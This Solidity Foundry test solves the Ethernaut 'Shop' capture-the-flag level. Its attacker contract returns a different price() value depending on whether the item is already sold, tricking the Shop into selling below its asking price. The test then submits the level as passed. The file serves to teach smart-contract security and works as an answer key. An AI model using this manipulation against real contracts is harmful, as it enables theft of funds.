pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Shop } from "src/Shop/Shop.sol";
import { ShopFactory } from "src/Shop/ShopFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract ShopHack {
    address shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function attack() public {
        (bool success,) = shop.call(abi.encodeWithSignature("buy()"));
        require(success);
    }

    function price() external returns (uint256) {
        (bool success, bytes memory data) = shop.call(abi.encodeWithSignature("isSold()"));
        (bool isSold) = abi.decode(data, (bool));
        if (!isSold) {
            return 100;
        } else {
            return 1;
        }
    }
}

contract ShopTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testShopHack() external {
        // level setup
        ShopFactory factory = new ShopFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        Shop shop = Shop(payable(levelAddress));

        // attack
        ShopHack attacker = new ShopHack(address(shop));

        attacker.attack();

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
